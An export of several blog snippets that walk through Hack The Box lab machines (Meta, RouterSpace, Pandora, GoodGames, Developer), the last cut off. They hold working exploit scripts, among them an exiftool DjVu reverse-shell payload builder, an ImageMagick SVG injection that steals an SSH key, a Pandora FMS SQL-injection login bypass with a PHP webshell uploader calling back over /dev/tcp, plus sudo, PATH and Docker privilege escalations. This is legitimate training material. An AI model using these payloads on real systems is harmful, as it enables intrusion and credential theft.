[ { "title": "Hackthebox - Meta", "url": "/posts/meta/", "categories": "hackthebox, linux", "tags": "exiftool, cve-2021-22204, imagemagick, pdf-parsing, neofetch, xdg_config_home, sudo env_keep", "date": "2022-06-08 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.140 acute.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)| 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)|_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)80/tcp open http Apache httpd|_http-server-header: Apache|_http-title: Did not follow redirect to http://artcorp.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Hostname from nmap scan: artcorp.htb Looks like, Webserver running static web page and no where to go ffuf scan❯ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H &quot;Host: FUZZ.artcorp.htb&quot; -u &#39;http://10.10.11.140&#39; -ac -v... [snip] ...________________________________________________[Status: 200, Size: 247, Words: 16, Lines: 10, Duration: 323ms]| URL | http://10.10.11.140 * FUZZ: dev01 ffuf found a subdomain http://dev01.artcorp.htb/ Note: This is most common is htb boxes, If server is redirect to a hostname then there is high chance of a vHost or subdomain on that hostname.There is a file upload in /metaview endpoint on that subdomainFootholdexiftool CVE-2021-22204Application outputs jpg/png file metadataFrom png image metadata output i guessed that this application is using exiftool There is a RCE in exiftool CVE-2021-22204 https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/ https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html https://github.com/convisolabs/CVE-2021-22204-exiftool https://hackerone.com/reports/1154542 Description: Improper neutralization of user data in the DjVu file format in exiftool versions 7.44 and up allows arbitrary code execution when parsing the malicious image.ExploitSetting up reverse shell payload image file.# Installs the required toolssudo apt install djvulibre-bin# Create payload file with perl reverse shell# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perlIP=tun0PORT=&#39;4141&#39;rev_shell=$(echo &quot;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#39;tcp&#39;));if(connect(S,sockaddr_in($PORT,inet_aton(&#39;$IP&#39;)))){open(STDIN,&#39;&amp;gt;&amp;amp;S&#39;);open(STDOUT,&#39;&amp;gt;&amp;amp;S&#39;);open(STDERR,&#39;&amp;gt;&amp;amp;S&#39;);exec(&#39;/bin/sh -i&#39;);};&quot; | base64 -w0)payload=&#39;(metadata &quot;\\c${use MIME::Base64;eval(decode_base64(&#39;\\&#39;$rev_shell\\&#39;&#39;))};&quot;)&#39;echo $payload &amp;gt; payload# Compress our payload file with to make it non human-readablebzz payload payload.bzz# INFO = Anything in the format &#39;N,N&#39; where N is a number# BGjp = Expects a JPEG image, but we can use /dev/null to use nothing as background image# ANTz = Will write the compressed annotation chunk with the input filedjvumake exploit.djvu INFO=&#39;1,1&#39; BGjp=/dev/null ANTz=payload.bzzCreate Config file for exiftool%Image::ExifTool::UserDefined = ( # All EXIF tags are added to the Main table, and WriteGroup is used to # specify where the tag is written (default is ExifIFD if not specified): &#39;Image::ExifTool::Exif::Main&#39; =&amp;gt; { # Example 1. EXIF:NewEXIFTag 0xc51b =&amp;gt; { Name =&amp;gt; &#39;HasselbladExif&#39;, Writable =&amp;gt; &#39;string&#39;, WriteGroup =&amp;gt; &#39;IFD0&#39;, }, # add more user-defined EXIF tags here... },);1; #endThen update regular image file with djvu file content.exiftool -config configfile &#39;-HasselbladExif&amp;lt;=exploit.djvu&#39; sator.jpegStart nc listener and upload image.Scripts for foothold automationFor generating backdoor image file.#!/bin/bashIP=$1PORT=$2base64_revshell=$(echo &quot;use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#39;tcp&#39;));if(connect(S,sockaddr_in($PORT,inet_aton(&#39;$IP&#39;)))){open(STDIN,&#39;&amp;gt;&amp;amp;S&#39;);open(STDOUT,&#39;&amp;gt;&amp;amp;S&#39;);open(STDERR,&#39;&amp;gt;&amp;amp;S&#39;);exec(&#39;/bin/bash -i&#39;);};&quot; | base64 -w0)payload=&#39;(metadata &quot;\\c${use MIME::Base64;eval(decode_base64(&#39;\\&#39;$base64_revshell\\&#39;&#39;))};&quot;)&#39;echo $payload &amp;gt; payloadbzz payload payload.bzzrm payloaddjvumake exploit.djvu INFO=&#39;1,1&#39; BGjp=/dev/null ANTz=payload.bzzrm payload.bzzcat &amp;gt;configfile &amp;lt;&amp;lt;EOL%Image::ExifTool::UserDefined = ( # All EXIF tags are added to the Main table, and WriteGroup is used to # specify where the tag is written (default is ExifIFD if not specified): &#39;Image::ExifTool::Exif::Main&#39; =&amp;gt; { # Example 1. EXIF:NewEXIFTag 0xc51b =&amp;gt; { Name =&amp;gt; &#39;HasselbladExif&#39;, Writable =&amp;gt; &#39;string&#39;, WriteGroup =&amp;gt; &#39;IFD0&#39;, }, # add more user-defined EXIF tags here... },);1; #endEOLexiftool -config configfile &#39;-HasselbladExif&amp;lt;=exploit.djvu&#39; sator.jpeg -overwrite_originalrm configfile exploit.djvuFor file upload.import requests as rimport syshost = &#39;http://dev01.artcorp.htb&#39;try: file = sys.argv[1] with open(file, &#39;rb&#39;) as f: r.post(f&quot;{host}/metaview/index.php&quot;, files={&#39;imageUpload&#39;: (&#39;sator.jpeg&#39;, f), &#39;submit&#39;: (None, None)}, timeout=10)except Exception as e: print(e)PrivescWe are currently as www-data(remote) www-data@meta:/$ whoamiwww-data1 user on the box╔══════════╣ Users with consoleroot:x:0:0:root:/root:/bin/bashthomas:x:1000:1000:thomas,,,:/home/thomas:/bin/bashImageMagick PDF-parsing flawscrapping filesystem using find commandfind / -type f -user thomas 2&amp;gt;/dev/null# Found neofetch config file/home/thomas/.config/neofetch/config.conffind / -type f -printf &quot;%T+ %p\\n&quot; 2&amp;gt;/dev/null | grep -v &quot;0000\\|sys\\|doc\\|proc\\|python\\|boot\\|share\\|dpkg\\|run\\|var\\|ImageMagick\\|lib&quot;# Found a bash script.2022-01-03+10:13:19.8059060230 ./usr/local/bin/convert_images.shScript is owned by root and running mogrify command inside /var/www/dev01.artcorp.htb/convert_images/ directory.(remote) www-data@meta:/$ ls -la ./usr/local/bin/convert_images.sh-rwxr-xr-x 1 root root 126 Jan 3 10:13 ./usr/local/bin/convert_images.sh(remote) www-data@meta:/$ cat ./usr/local/bin/convert_images.sh#!/bin/bashcd /var/www/dev01.artcorp.htb/convert_images/ &amp;amp;&amp;amp; /usr/local/bin/mogrify -format png *.* 2&amp;gt;/dev/nullpkill mogrifyAnd there is a cron running from user “thomas” that executing /usr/local/bin/convert_images.shmogrify is part of “ImageMagick” and current installed version on the box is “ImageMagick 7.0.10-36”(remote) www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ convert -versionVersion: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.orgCopyright: © 1999-2020 ImageMagick Studio LLCLicense: https://imagemagick.org/script/license.phpFeatures: Cipher DPC HDRI OpenMP(4.5) Delegates (built-in): fontconfig freetype jng jpeg png x xml zlib`And there is a bug in ImageMagick before 7.0.10-40. This bug allow an attacker to execute shell commands using ImageMagick PDF-parsing via maliciously crafted svg file. https://portswigger.net/daily-swig/imagemagick-pdf-parsing-flaw-allowed-attacker-to-execute-shell-commands-via-maliciously-crafted-image https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.htmlPoC file.&amp;lt;image authenticate=&#39;ff&quot; `echo $(cat /home/thomas/.ssh/id_rsa) &amp;gt; /dev/shm/id_rsa`;&quot;&#39;&amp;gt; &amp;lt;read filename=&quot;pdf:/etc/passwd&quot;/&amp;gt; &amp;lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&amp;gt; &amp;lt;resize geometry=&quot;400x400&quot; /&amp;gt; &amp;lt;write filename=&quot;test.png&quot; /&amp;gt; &amp;lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&amp;gt; &amp;lt;image xlink:href=&quot;msl:poc.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&amp;gt; &amp;lt;/svg&amp;gt;&amp;lt;/image&amp;gt;save as “test.svg” inside /var/www/dev01.artcorp.htb/convert_images/ and wait for few minute - watch -n 1 ls -la /dev/shmAnd login “thomas” private ssh key as user “thomas”sudo neofetch with XDG_CONFIG_HOMEUser “thomas” can run /usr/bin/neofetch as root with NOPASSWDthomas@meta:~$ sudo -lMatching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOMEUser thomas may run the following commands on meta: (root) NOPASSWD: /usr/bin/neofetch \\&quot;\\&quot;And there is gtfobin for neofetch - https://gtfobins.github.io/gtfobins/neofetch/TF=$(mktemp)echo &#39;exec /bin/sh&#39; &amp;gt;$TFsudo neofetch --config $TFBut it is not working.We already found config file from find command /home/thomas/.config/neofetch/config.confecho &#39;exec /bin/sh&#39; &amp;gt; /home/thomas/.config/neofetch/config.confsudo /usr/bin/neofetch \\&quot;\\&quot;But still not working.There is a keep env variable env_keep+=XDG_CONFIG_HOMEAnd we can see from one of neofetch issue on github https://github.com/dylanaraps/neofetch/issues/1088 https://github.com/dylanaraps/neofetch/commit/1278844d87fc9d133258b9ba332fbed3a97c0279That, Config file is loading form “XDG_CONFIG_HOME” env variable.So setting XDG_CONFIG_HOME allow neofetch to access user defined config file from user’s .config directory.export XDG_CONFIG_HOME=&quot;$HOME/.config&quot;echo &#39;exec /bin/bash&#39; &amp;gt; /home/thomas/.config/neofetch/config.confsudo /usr/bin/neofetch \\&quot;\\&quot;" }, { "title": "Hackthebox - RouterSpace", "url": "/posts/routerspace/", "categories": "hackthebox, linux", "tags": "android, application, apk, dynamic-analysis, sudoedit, ve-2021-3156", "date": "2022-05-12 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.148 routerspace.htbnmap scan: TCP/IPPORT STATE SERVICE VERSION22/tcp open ssh (protocol 2.0)| fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1| ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)| 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)|_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)80/tcp open http| fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK| X-Powered-By: RouterSpace| X-Cdn: RouterSpace-285| Content-Type: text/html; charset=utf-8| Content-Length: 64| ETag: W/&quot;40-IsjmuQeSoXp5nkQG8W0b7AT2rqg&quot;| Date: Fri, 13 May 2022 01:39:18 GMT| Connection: close| Suspicious activity detected !!! {RequestID: 3 A ob6Q }| GetRequest: | HTTP/1.1 200 OK| X-Powered-By: RouterSpace| X-Cdn: RouterSpace-68559| Accept-Ranges: bytes| Cache-Control: public, max-age=0| Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT| ETag: W/&quot;652c-17d476c9285&quot;| Content-Type: text/html; charset=UTF-8| Content-Length: 25900| Date: Fri, 13 May 2022 01:39:15 GMT| Connection: close| &amp;lt;!doctype html&amp;gt;| &amp;lt;html class=&quot;no-js&quot; lang=&quot;zxx&quot;&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&amp;gt;| &amp;lt;title&amp;gt;RouterSpace&amp;lt;/title&amp;gt;| &amp;lt;meta name=&quot;description&quot; content=&quot;&quot;&amp;gt;| &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/owl.carousel.min.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/magnific-popup.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&amp;gt;| &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;css/themify-icons.css&quot;&amp;gt;| HTTPOptions: | HTTP/1.1 200 OK| X-Powered-By: RouterSpace| X-Cdn: RouterSpace-23456| Allow: GET,HEAD,POST| Content-Type: text/html; charset=utf-8| Content-Length: 13| ETag: W/&quot;d-bMedpZYGrVt1nR4x+qdNZ2GqyRo&quot;| Date: Fri, 13 May 2022 01:39:16 GMT| Connection: close| GET,HEAD,POST| RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request|_ Connection: close|_http-title: RouterSpace|_http-trane-info: Problem with XML parsing of /evox/about2 services unrecognized despite returning data.Nothing interesting on home page, except a download link for an android application. Click for full imageAlso don’t find anything interesting from decompiling apk.FootholdAndroid app dynamic analysisRunning apk in android emulator genymotion.For Running and Intercepting application traffic we need to do some configurations. Install genymotion and virtualbox and other required libraries. Download: https://www.genymotion.com/download/ Install: https://docs.genymotion.com/desktop/Get_started/013_Linux_install/ If you get Error: “An error has occurred while trying to create a VirtualBox host-only network interface.” Run this: sudo apt-get --reinstall install virtualbox-dkms Add new virtual device with Android API version less than or equal to Android 8.1 OR API 27. I use “NAT” network mode for virtualbox network interface. Install xposedinstaller and JustTrustMe, and enable “JustTrustMe” from xposed modules. Install burp CA certificate as root. Put burp proxy address in your android VM using adb shell. There are some changes in Android CA policies since Android N (Android version 7.0 to 7.1) which makes it hard to intercept application traffic because of the certificate pinning. RECOMMENDED version is 4.4 but application doesn’t support old android API. if you want to use newer version then it must NOT greater then 8.1 because there a xposed module (JustTrustMe) available to bypass certificate pinning up to Android API 27 - https://forum.xda-developers.com/t/official-xposed-for-lollipop-marshmallow-nougat-oreo-v90-beta3-2018-01-29.3034811/ xposedinstaller - https://forum.xda-developers.com/attachments/xposedinstaller_3-1-5-apk.4393082/ JustTrustMe - https://github.com/Fuzion24/JustTrustMe/releases/download/v.2/JustTrustMe.apk And for intercepting application traffic in newer android we need to install burp CA certificate as root - https://blog.ropnop.com/configuring-burp-suite-with-android-nougat/# Convert DER to PEMopenssl x509 -inform DER -in cacert.der -out cacert.pem# Get subject_hash_old (or subject_hash if OpenSSL &amp;lt; 1.0)openssl x509 -inform PEM -subject_hash_old -in cacert.pem |head -1# Rename cacert.pem to &amp;lt;hash&amp;gt;.0mv cacert.pem 9a5ba575.0# Remount and copy cert to deviceadb rootadb remountadb push 9a5ba575.0 /sdcard/adb shellvbox86p:/ # mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/vbox86p:/ # chmod 644 /system/etc/security/cacerts/9a5ba575.0vbox86p:/ # exitadb rebootAnd, for routing traffic through Burpsuite, add burp proxy using adb shelladb shell settings put global http_proxy localhost:3333adb reverse tcp:3333 tcp:8080# for removing proxy from androidadb shell settings put global http_proxy :0And finally proxy setup completed successfully, now we can intercept application traffic. Got a hostname: routerspace.htb, add in /etc/hosts file.And that “ip” parameter is vulnerable for command injectioncurl -s -X POST \\ -H &#39;user-agent: RouterSpaceAgent&#39; -H &#39;Content-Type: application/json&#39; -H &#39;Host: routerspace.htb&#39; \\ --data-binary $&#39;{\\&quot;ip\\&quot;:\\&quot;;id\\&quot;}&#39; \\ $&#39;http://10.10.11.148/api/v4/monitoring/router/dev/check/deviceAccess&#39;But reverse shell is not working, Maybe we have to enumerate file system from here.Here’s simple python script for that.import requests as rimport syscmd = sys.argv[1]headers = {&#39;user-agent&#39;: &#39;RouterSpaceAgent&#39;, &#39;Content-Type&#39;: &#39;application/json&#39;, &#39;Host&#39;: &#39;routerspace.htb&#39;}url = &#39;http://10.10.11.148/api/v4/monitoring/router/dev/check/deviceAccess&#39; data = {&quot;ip&quot;:f&quot;;{cmd}&quot;}req = r.post(url=url, json=data, headers=headers)print(req.text.encode(&#39;utf-8&#39;).decode(&#39;unicode_escape&#39;))Don’t find private ssh key but we have write access so we could add our public key inside /home/paul/.ssh/authorized_keys use ssh-keygen to generate ssh key pair python exploit.py &#39;echo &quot;&amp;lt;ssh_public_key&amp;gt;&quot; &amp;gt; /home/paul/.ssh/authorized_keys&#39; And successfully get ssh shell as user “paul”.PrivescSudoedit ExploitThere are some IPtable rules which blocking any unwanted incoming or outgoing traffic which blocks our reverse shell.Easiest way to put linpeas.sh script in the box is using scp command.scp -i paul linpeas.sh paul@10.10.11.148:/tmpLinpeas “Linux Exploit Suggester” check found that box is vulnerable for sudoedit exploit. Here is working exploit version - https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py" }, { "title": "Hackthebox - Pandora", "url": "/posts/pandora/", "categories": "hackthebox, linux", "tags": "sqli, snmp, file-upload, setresuid", "date": "2022-05-10 18:30:00 +0000", "snippet": "EnumerationIP-ADDR: 10.10.11.136 pandora.htbnmap scan: TCP/IPPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)| 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)|_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Play | LandingService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Noting interested found webapp, except a hostname panda.htb from multiple places on /index.htmlnmap scan: UDPPORT STATE SERVICE161/udp open|filtered snmpFootholdenumerating SNMP Check pit box write-up for detail information on SNMPafter running for a while, snmpwalk found some strings from “hrSWRunParameters” in which found some creds.❯ snmpwalk -v2c -c public 10.10.11.136 1.3.6.1.2.1.25.4.2.1.5.822HOST-RESOURCES-MIB::hrSWRunParameters.822 = STRING: &quot;-c sleep 30; /bin/bash -c &#39;/usr/bin/host_check -u daniel -p HotelBabylon23&#39;&quot; Creds: daniel:HotelBabylon23 you could run snmpwalk -v2c -c public 10.10.11.136 hrSWRunParameters to view all stings.And successfully logged-in into SSH with found creds.Lateral movementThere are 2 interesting binaries/usr/bin/pandora_backup/usr/bin/host_checkAnd 1 more user besides “daniel”,matt:x:1000:1000:matt:/home/matt:/bin/bashWho have access to SUID binary /usr/bin/pandora_backup-rwsr-x--- 1 root matt 16816 Dec 3 15:58 /usr/bin/pandora_backupThere are 2 www direcotriesdrwxr-xr-x 3 root root 4096 Dec 7 14:32 htmldrwxr-xr-x 3 matt matt 4096 Dec 7 14:32 pandora“Pandora” is owned by user “matt”Viewing /etc/hosts file found another vHost pandora.pandora.htbdaniel@pandora:/var/www/pandora$ cat /etc/hosts127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb127.0.1.1 pandoraBut “Pandora” is not available from remote because it is configured to access only from localhostdaniel@pandora:/etc/apache2/sites-available$ cat pandora.conf &amp;lt;VirtualHost localhost:80&amp;gt; ServerAdmin admin@panda.htb ServerName pandora.panda.htb DocumentRoot /var/www/pandora AssignUserID matt matt &amp;lt;Directory /var/www/pandora&amp;gt; AllowOverride All &amp;lt;/Directory&amp;gt; ErrorLog /var/log/apache2/error.log CustomLog /var/log/apache2/access.log combined&amp;lt;/VirtualHost&amp;gt;And service running is “Pandora FMS”daniel@pandora:/etc/apache2/sites-available$ curl -s http://127.0.0.1/pandora_console/ | grep -i &#39;&amp;lt;title&amp;gt;&#39; &amp;lt;title&amp;gt;Pandora FMS - the Flexible Monitoring System&amp;lt;/title&amp;gt;One way we can access to this localhost services is using ssh dynamic port forwardingssh -D 4141 daniel@10.10.11.136Then, there are multiple ways to configure proxy using proxychains, shell env_variable, browser proxy add-on, burpsuite. proxychains: Append “socks5 127.0.0.1 4141” line in the end of the “/etc/proxychains.conf” and comment out any other active proxy. shell env_variable: Run following command: export http_proxy=socks5://127.0.0.1:4141 browser proxy add-on: Use “FoxyProxy” and add new proxy rule for “Proxy Type=SOCKS5”, “IP=127.0.0.1”, “PORT=4141” Burpsuite: If you are using burp than check this - “User options –&amp;gt; Connections –&amp;gt; SOCKS proxy”Pandora FMS - SQLi and file upload Running version is: v7.0NG.742_FIX_PERL2020, Found in the bottom of the login pageLogin with creds return some access limitations errorThere are some bugs in Pandora FMS 742 Disclosure Blog: https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/ CVE Detail: https://www.cvedetails.com/cve/CVE-2021-32099/Artica-Pandora-Fms-742.html PoC Video: https://youtu.be/61KE45V7VT8 CVE-2021-32099: A SQL injection vulnerability in the pandora_console component of Artica Pandora FMS 742 allows an unauthenticated attacker to upgrade his unprivileged session via the /include/chart_generator.php session_id parameter, leading to a login bypass.Used to bypass login.Code reviewHere is the step file of Pandora FMS v7.0NG.742but we are going to read sourcecode from /var/www/pandora/pandora_consoleIt start from ./include/chart_generator.phpsession_id parameter value assign to phpsessionid and pass to ./include/lib/User.phpHere phpsessionid value assign to id_session and pass to db_get_row_filter() function.This function found in many places but we are intrested in mysql’s version (because ss -lntp PORT 3306) of that function which found in ./include/db/mysql.phpSo, here is the sql query statement sprintf(&#39;SELECT %s FROM %s %s&#39;, $fields, $table, $filter)And here’s how it looks like, when it get executed fields == * table == tsessions_php filter == id_session == phpsessionid == session_idSELECT * FROM tsessions_php WHERE id_session=session_idSQLMAPWe have enough information, Time to run sqlmapsqlmap --url &quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=&quot; --batch --dbms=mysql --proxy &#39;socks5://127.0.0.1:4141&#39;sqlmap --url &quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=&quot; --batch --dbms=mysql --proxy &#39;socks5://127.0.0.1:4141&#39; --technique=E --dbs... [snip] ...[18:13:19] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)web application technology: PHP, Apache 2.4.41back-end DBMS: MySQL &amp;gt;= 5.0.0 (MariaDB fork)[18:13:19] [INFO] fetching database names[18:13:20] [INFO] retrieved: &#39;information_schema&#39;[18:13:21] [INFO] retrieved: &#39;pandora&#39;available databases [2]:[*] information_schema[*] pandorasqlmap --url &quot;http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=&quot; --batch --dbms=mysql --proxy &#39;socks5://127.0.0.1:4141&#39; --technique=E -D pandora -T tsessions_php --dumpHere are those session and there decoded values.Copy admin cookie encode value from “id_session” column and replace “PHPSESSID” value with it using cookie editor and refresh pandora login page.Or you could use some sql inject payload to set your session as admin without dumping table everytime using /include/chart_generator.php parameter session_id with sql injection payload.http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=1&#39; union select &#39;NULL&#39;,&#39;NULL&#39;,&#39;id_usuario|s:5:&quot;admin&quot;;&#39;-- -And the complete query looks like thisSELECT * FROM tsessions_php WHERE id_session=&#39;1&#39; union select &#39;NULL&#39;,&#39;NULL&#39;,&#39;id_usuario|s:5:&quot;admin&quot;;&#39;-- -File UploadAnd here we have admin panel with insecure file upload functionIf you intercept file upload request you will found upload location is /var/www/pandora/pandora_console/images that means /pandora_console/images from web server.We have done so much and here is the python presentation of itimport requestsimport netifaces as nibase_path = &quot;http://127.0.0.1/pandora_console&quot;tun0_ip = ni.ifaddresses(&#39;tun0&#39;)[ni.AF_INET][0][&#39;addr&#39;]rev = f&quot;&amp;lt;?php exec(\\&quot;/bin/bash -c &#39;bash -i &amp;gt; /dev/tcp/{tun0_ip}/4242 0&amp;gt;&amp;amp;1&#39;\\&quot;); ?&amp;gt;&quot;s = requests.Session()s.proxies = {&quot;http&quot;: &quot;socks5://127.0.0.1:4141&quot;}sqli = &quot;/include/chart_generator.php?session_id=1&#39; union select &#39;1&#39;,&#39;2&#39;,&#39;id_usuario|s:5:\\&quot;admin\\&quot;;&#39; -- -&quot;sess = s.post(base_path + sqli)if &quot;Pandora FMS Graph ( - )&quot; in sess.text: print(&quot;[ + ] Logged in!&quot;) file_ = {&#39;file&#39;: (&quot;shell.php&quot;, rev, &#39;application/x-php&#39;), &#39;umask&#39;: (None, None), &#39;decompress_sent&#39;: (None, 1), &#39;go&#39;: (None, &#39;Go&#39;), &#39;real_directory&#39;: (None, &#39;/var/www/pandora/pandora_console/images&#39;), &#39;directory&#39;: (None, &#39;images&#39;), &#39;hash&#39;: (None, &#39;6427eed956c3b836eb0644629a183a9b&#39;), &#39;hash2&#39;: (None, &#39;594175347dddf7a54cc03f6c6d0f04b4&#39;), &#39;upload_file_or_zip&#39;: (None, 1)} shell_upload = s.post(base_path + &quot;/index.php?sec=gsetup&amp;amp;sec2=godmode/setup/file_manager&quot;, files=file_) if &quot;Uploaded successfully&quot; in shell_upload.text: print(&quot;[ + ] Great. PHP script uploaded... Now going to execute for you...&quot;) try: f = s.get(base_path + &#39;/images/shell.php&#39;, timeout=0.0001) print(f.text) except requests.exceptions.ReadTimeout: pass else: print(&quot;[ - ] Failed to upload PHP script...&quot;) print(shell_upload.text)else: print(&quot;[ - ] Cannot login to PandoraFMS...&quot;)Privescsetresuid Restriction BypassNow we can access to /usr/bin/pandora_backup.But running sudo -l gives an error(remote) matt@pandora:/home/matt$ sudo -lsudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permittedsudo: unable to initialize policy pluginAnd this error tells that user don’t have permission to run setresuid() function.That means we can not able to run suid binaries as root.we could use at command to bypass shell restrictionecho &quot;/bin/sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&quot; | at now; tail -f /dev/nullNow, Running strings on that bianry found 1 command, That this bianry is executingtar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*Here we can exploit tar command absolute path as bianry is not using tar command absolute pathcd /tmpecho &quot;/bin/bash&quot; &amp;gt; tarchmod 777 tarexport PATH=/tmp:$PATH/usr/bin/pandora_backup" }, { "title": "Hackthebox - GoodGames", "url": "/posts/goodGames/", "categories": "hackthebox, linux", "tags": "sqli, ssti, docker escape", "date": "2022-02-28 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.130 goodGames.htbnmap scan:PORT STATE SERVICE VERSION80/tcp open ssl/http Werkzeug/2.0.2 Python/3.9.2|_http-server-header: Werkzeug/2.0.2 Python/3.9.2|_http-title: GoodGames | Community and Store Hostname: GoodGames.HTBA normal looking web app talking about video gamesThere is a option for signup/loginThere is really simple sql injection in email parameter to bypass login and get adminAfter login, there is a extra settings icon in top right corner which redirect to a subdomain internal-administration.goodgames.htbAnother login page form subdomainFootholdSQLiback to the login sql injection, There’s a reflected field in loginDump database database_name: main table: user column: id,email,password,name&#39; UNION SELECT ALL 1,2,3,group_concat(id,&quot;:&quot;,email,&quot;:&quot;,password,&quot;:&quot;,name) from main.user#password cracked with john using rockyou.txt1:admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec:admin:superadministratorAnd these creds reuse in subdomain Flask DashboardSSTIIn the volt dashboard, found SSTI(Server-Side Template Injection) in /settings reflected in the user’s profile name From nmap scan, this is a Python server so template framework is possibly jinja2.Payload form PayloadsAllTheThingsGet reverse shell with payloadGet root shell inside docker container.PrivescDocker escapeRunning deepce.sh script, find host mounts====================================( Enumerating Mounts )====================================[+] Docker sock mounted ....... No[+] Other mounts .............. Yes/home/augustus /home/augustus rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro[+] Possible host usernames ... augustus rw,relatime - ext4 /home/augustus directory contains user flag and user augustus in not in the docker container.Host is reachable from container and running sshssh to host using reused password superadministrator for user “augustus”Host mount inside dockerWe know that /home/augustus mounted in the container and we are root in the container.That means we can create any file or edit any file inside /home/augustus directory as root.just copy host bash binary in user’s directory and give suid permission as root from container.augustus@GoodGames:~$ cp /bin/bash .augustus@GoodGames:~$ exitroot@3a453ab39d3d:/home/augustus$ chown root:root bashroot@3a453ab39d3d:/home/augustus$ chmod +s bashroot@3a453ab39d3d:/home/augustus$ ssh augustus@172.19.0.1augustus@GoodGames:~$ ./bash -p" }, { "title": "Hackthebox - Developer", "url": "/posts/developer/", "categories": "hackthebox, linux", "tags": "Tabnabbing, django deserialization, postgresql, rust binary reversing", "date": "2022-01-22 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.11.103 developer.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 36:aa:93:e4:a4:56:ab:39:86:66:bf:3e:09:fa:eb:e0 (RSA)| 256 11:fb:e9:89:2e:4b:66:40:7b:6b:01:cf:f2:f2:ee:ef (ECDSA)|_ 256 77:56:93:6e:5f:ea:e2:ad:b0:2e:cf:23:9d:66:ed:12 (ED25519)80/tcp open tcpwrapped|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://developer.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Port 80, web server redirect to developer.htbThere is a signup pageand login pageGobuster scan get so may responses with 301 with Size: 0. Most of requested directories that get 301 have admin common in them.gobuster dir -u &quot;http://developer.htb&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -o gobuster.txt -t 50# ... [snip] 